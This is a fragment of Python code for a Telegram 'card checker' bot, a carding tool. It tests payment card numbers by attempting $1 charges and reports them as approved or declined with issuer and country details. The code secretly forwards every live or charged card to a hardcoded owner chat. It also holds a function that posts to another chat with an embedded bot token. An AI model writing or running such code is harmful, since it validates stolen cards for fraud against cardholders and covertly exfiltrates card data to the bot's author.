        if "requires_action" in last:
            message_ra = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: VBV.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id)
            
            # Send to owner
            try:
                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
            except:
                pass
                
        elif "succeeded" in last:
            msg_sec = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
					
𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id)
            
            # Send to owner
            try:
                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
            except:
                pass
                
        else:
            msg_dec = f'''𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
					
𝗖𝗮𝗿𝗱: {cc}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Declined.

𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cn} {emj}

𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id)
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        bot.reply_to(message, "An unexpected error occurred. Please try again later.")
    
    
def send_telegram_notification(msg1):
    url = f"https://api.telegram.org/bot7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM/sendMessage"
    data = {'chat_id': -4970290554, 'text': msg1, 'parse_mode': 'HTML'}
    requests.post(url, data=data)
    
bot.infinity_polling()
